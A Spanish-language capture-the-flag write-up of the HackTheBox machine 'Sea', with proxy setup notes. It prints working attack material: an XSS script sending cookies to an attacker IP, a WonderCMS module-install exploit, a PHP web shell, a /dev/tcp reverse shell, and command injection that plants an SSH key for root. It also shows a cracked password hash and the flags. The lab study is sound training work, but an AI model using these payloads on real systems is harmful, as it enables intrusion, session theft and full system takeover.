---
title: "Sea — HTB (Easy)"
date: 2026-05-18
tags:
  - hackthebox
  - linux
  - writeup
  - easy
draft: false
description: "Writeup de la máquina Sea de HackTheBox (Easy, Linux)."
---

<div class="page">

![[sea-img/01.png]]

nmap -sS --min-rate 5000 -vvv --open -p- -n -Pn 10.129.94.108 -oG allports <span style="color:#3fbf4f;">\# -A: Enable OS detection, version detection, script scanning, and traceroute, no usar el -A :v</span>

nmap -sC -sV -vvv --open -p22,80 -n -Pn 10.129.94.108 -oN targeted <span style="color:#3fbf4f;">\# sea.htb asi que agregarla al</span> <span style="color:#3fbf4f;">/etc/hosts</span>

### Caido

1 ir a la web caido.io, iniciar sesion con github ir a download page, de ahi ir a la pagina de github descargar la mas reciente y con un dpkg -i instalamos el ultimo release, lo abrimos y es siguiente siguiente..

2 cuando lo abres pide que te logees y crees una instancia y listo, es como el match web y la herramienta asi que ya estas logeado en la tool y en la web

3 el proxy en foxyproxy es el mismo, ahi mismo en el tutorial viene la forma de instalar el certificado ca que es practicamente igual al de burp

4 vamos a http history le damos a install plugin en response pa que renderice la pagina de respuesta <span style="color:#3fbf4f;">\#:D</span>

![[sea-img/02.png]]

https://docs.caido.io/guides/

req.path.eq:"/" and req.host.cont:"www.google." <span style="color:#3fbf4f;">\# HTTPQL simple query</span>

http://10.129.231.170:5000/

1 ir a scope y agregar ip y dns si tiene

2 vamos al portal y nos registramos...cerramos session, probamos algunas veces de forma incorrecta

3 vamos al intercept y ctrl + R para enviar al replay/repeater , le ponemos nombres descriptivos pa organizar las peticiones o lo que estamos haciendo

4 ctr + f pa buscar por alguna cadena ya sea en el request o en el response

5 click derecho o la tecla pa mandarlo al automate, seleccionas lo que va a cambiar y le das al + importante :p se va a resaltar mas esa palabra, configuras el payload, diccionario, etc y le das a run

<span style="color:#3fbf4f;">podemos ir viendo como van incrementanddo las solicitudes.. filtrar por lo que nos interesa resp.raw.ncont:"Invalid credentials" y esperar poque esta en la 17000</span>

![[sea-img/03.png]]

<span style="color:#3fbf4f;">enviar al replay, enviar al findings, en el replay send... y en el response follow redirection</span>

### Seclist

apt -y install seclists

escanear directorios

gobuster dir -u http://sea.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x html,php,txt --proxy http://127.0.0.1:8080

python3 -m http.server 80

http://10.10.14.32/test

<span style="color:#3fbf4f;">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</span><span style="color:#3fbf4f;"></span>

<span style="color:#3fbf4f;">10.129.94.108 - - \[07/Apr/2025 23:00:55\] code 404, message File not found</span><span style="color:#3fbf4f;"></span>

<span style="color:#3fbf4f;">10.129.94.108 - - \[07/Apr/2025 23:00:55\] "GET /test HTTP/1.1" 404 -</span><span style="color:#3fbf4f;"></span>

<span style="color:#3fbf4f;"></span>

pa probar un xss:

python3 -m http.server 80

http://10.10.14.32/xss.js

<div class="codebox">

    var xhr = new XMLHttpRequest();
    xhr.open('GET', "http://10.10.14.32/?cookie=" + document.cookie);
    xhr.send();

</div>

gobuster dir -u http://sea.htb/themes/bike/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x html,php,txt --proxy http://127.0.0.1:8080

sea.htb/themes/bike/LICENSE <span style="color:#f9ff23;">\# turboblack / WonderCMS</span>

searchsploit wondercms

searchsploit -m 51805

zip main.zip -r setensa <span style="color:#f9ff23;">\# donde setensa tiene una cmd.php</span>

\<?php

system(\$\_GET\['cmd'\]);

?\>

python3 -m http.server 80

xss.js <span style="color:#3fbf4f;">\# del exploit lo siguiente.. y ajustamos el path</span>

<div class="codebox">

    var token = document.querySelectorAll('[name="token"]')[0].value;
    var urlRev = "/?installModule=http://10.10.14.32/main.zip&directoryName=violet&type=themes&token="  + token;
    var xhr3 = new XMLHttpRequest();
    xhr3.withCredentials = true;
    xhr3.open("GET", urlRev);
    xhr3.send();

</div>

http://sea.htb/index.php?page=loginURL?"\>\</form\>\<script+src="http://10.10.14.32/xss.js"\>\</script\>\<form+action="

![[sea-img/04.png]]

nc -lvnp 443 <span style="color:#3fbf4f;">\# listener de la shell</span>

http://sea.htb/themes/setensa/cmd.php?cmd=bash -c "bash -i \>& /dev/tcp/10.10.14.32/443 0\>&1"

http://sea.htb/themes/setensa/cmd.php?cmd=bash -c "bash -i \>%26 /dev/tcp/10.10.14.32/443 0\>%261" <span style="color:#f9ff23;">\# url encodear el &</span>

script /dev/null -c bash

ctrl z

stty raw -echo; fg

reset xterm

export TERM=xterm

export SHELL=bash

stty size <span style="color:#3fbf4f;">\# ver el size de nuestra shell estandar</span>

stty rows 41 columns 211 <span style="color:#3fbf4f;">\# aplicar size a shell del server</span>

/var/www/sea/data\$ cat database.js

"\$2y\$10\$iOrk210RQSAzNCx6Vyq2X.aJ\\D.GuE4jRIikYiWrD3TM\\PjDnXm4q"<span style="color:#3fbf4f;"> \# esta escapando la barra, para el cracking offline ahi que quitarla</span>

\$2y\$10\$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q

### Hashcat

hashcat hash /usr/share/wordlists/rockyou.txt -O -m 3200

\$2y\$10\$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance

hashcat hash /usr/share/wordlists/rockyou.txt -O -m 3200 --show

\$2y\$10\$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance

ssh amay@10.129.94.108

sshpass -p 'mychemicalromance' ssh amay@10.129.94.108

curl localhost:8080 --basic -u 'amay:mychemicalromance'

### PortForward

ssh amay@10.129.94.108 -L 8081:127.0.0.1:8080 <span style="color:#f9ff23;">\# mi puerto 8081 va a usarse para comunicarse al 8080 del localhost de esta maquina</span>

http://localhost:8081 <span style="color:#3fbf4f;">\# ir a mi localhost C:</span>

amay

mychemicalromance

<span style="color:#ff0000;">https://docs.caido.io/guides/proxy_local.html#proxying-local-traffic</span>

http://lvh.me:8081/ <span style="color:#3fbf4f;">\# que esta filtrado el trafico al localhost :v usar ese dns que esta asociado al localhost...meterlo en scope lvh.me y consultarlo asi con ese nombre</span>

![[sea-img/05.png]]

ssh-keygen

log_file=/etc/passwd; curl 10.10.14.32/id_ed25519.pub -o /root/.ssh/authorized_keys \#&analyze_log=

![[sea-img/06.png]]

ssh root@10.129.94.108

user.txt

<span style="color:#ff0000;">\# 2cf46292bb6c0378622ec1abaada2b91</span>

root.txt

<span style="color:#ff0000;">\# 5fff711cecc9c585e130ad1c9d023b29</span>

</div>
